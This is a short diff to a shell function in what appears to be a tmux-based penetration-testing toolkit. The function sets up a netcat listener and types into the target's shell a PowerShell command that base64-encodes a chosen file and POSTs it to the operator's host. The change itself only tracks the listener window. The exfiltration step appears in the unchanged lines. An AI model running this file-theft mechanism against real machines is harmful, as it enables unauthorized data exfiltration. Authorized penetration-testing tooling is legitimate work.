@@ -11,12 +11,14 @@ commander_run() {
   local dst_dir="$(dirname "$dst_file")"
   local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
   local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
+  local listener_id
 
   if [[ ! -d "$dst_dir" ]]; then
     mkdir -p "$dst_dir" || return
   fi
 
-  tmux new-window -d "nc -w 10 -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\""
+  listener_id="$(tmux new-window -P -d "nc -w 10 -nlvp \"$lport\" > \"$dst_file_b64\"; tail -1 \"$dst_file_b64\" | base64 -d > \"$dst_file\"; rm -f \"$dst_file_b64\"")"
 
   tmux send-keys "Invoke-WebRequest -uri http://$lhost:$lport/data.raw -Method POST -Body ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"$file_to_fetch\")))" Enter
+  tmux send-keys -t "$listener_id" "" Enter
 }
